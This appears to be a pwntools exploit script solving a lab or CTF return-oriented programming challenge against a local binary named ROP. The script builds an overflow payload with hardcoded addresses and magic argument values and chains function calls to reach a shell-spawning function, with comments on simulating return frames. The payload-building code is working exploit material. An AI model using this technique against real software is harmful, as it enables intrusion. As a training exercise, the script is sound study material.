#!/bin/python
""" Anyway I'm not gonna do Mark Zuckerberg:) I'm gonna do better or nothing! """

from math import exp
from random import randbytes
from pwn import *

#Config context:
context.arch = 'i386'

bufferLength = 27 * 4

#NOTE: We are using fscanf to exploit the vulnerability so we should avoid any whitespace.
#       If any whitespace found, then fscanf will ignore rest of the input

company = b'TorProject,Inc.'
garbage = b'A' * (bufferLength - len(company))
BP = b'BBBB'
tempWord = b'WWWW'

######          NEEDED INOFRMATION              #######
#
#    correct_answer:
#       Address: 0x08049256
#       Args:   
#           name1:      ebp + 0x8
#       Schema:
#           EBP:        Saved EBP
#           EBP + 0x4:  Saved RIP
#           EBP + 0x8:  0xdabbadaa
#
#   wrong_answer:
#       Address: 0x0804929e
#       Args:
#           name1:      ebp + 0x8
#           name2:      ebp + 0xc
#           name3:      ebp + 0x10
#       Schema:
#           EBP:        Saved EBP
#           EBP + 0x4:  Saved RIP
#           EBP + 0x8:  0xfacebaad
#           EBP + 0xc:  0xfacefeed
#           EBP + 0x10: 0xfacedead
#
#   wrong_answer:
#       Address: 0x0804929e
#       Args:
#           name1:      ebp + 0x8
#           name2:      ebp + 0xc
#       Schema:
#           EBP:        Saved EBP
#           EBP + 0x4:  Saved RIP
#           EBP + 0x8:  0xd0d0caca
#           EBP + 0xc:  0xb105f00d
#
#   Access_Shell:
#       Address: 0x08049333
#
#   Access_Shell Without saving EBP:
#       Address: 0x08049338

exploit = company + garbage + BP

# Call correct_answer:
exploit += pack(0x08049256, endianness='little', word_size=32)
#Here we need a return address but there is no such one because we aren't calling corrct_answer,
#   we are returning to it. so we shuold simulate a call instruction by saving a legal return
#   address here. To do so, we use Access_shell! Yeah we use this function because it has a 
#   legal address and also after execution execve('/bin', 0, 0) nothing bad happens, it just
#   returns -1 and continue execution.
#   NOTE: Also we can't return to the start of this function because after execution, again
#           it will expect a legal return address and we just are delaying the problem. 
#         To overpass this problem, instead of return to the start of this function we return to
#           the point which it thinks it is stored EBP! Now after returning it will extract the
#           next address as EBP and not return address.
#   NOTE: Doing so, the next address(0xdabbadaa) will be used as EBP but no problem because
#           we don't need it anyway. WE ARE JUST CONCERNED WITH ESP.
exploit += pack(0x08049338, endianness='little', word_size=32)#Saved RIP

exploit += pack(0xdabbadaa, endianness='little', word_size=32)

# Call wrong_answer
exploit += pack(0x0804929e, endianness='little', word_size=32)
# Same problem again but Now our return address is actually Access_Shell:)
exploit += pack(0x08049333, endianness='little', word_size=32)
exploit += pack(0xfacebaad, endianness='little', word_size=32)
exploit += pack(0xfacefeed, endianness='little', word_size=32)
exploit += pack(0xfacedead, endianness='little', word_size=32)

#Write exploit to file:
write('input.txt', exploit)

target = process(['./ROP', 'Vilmil'])
target.interactive()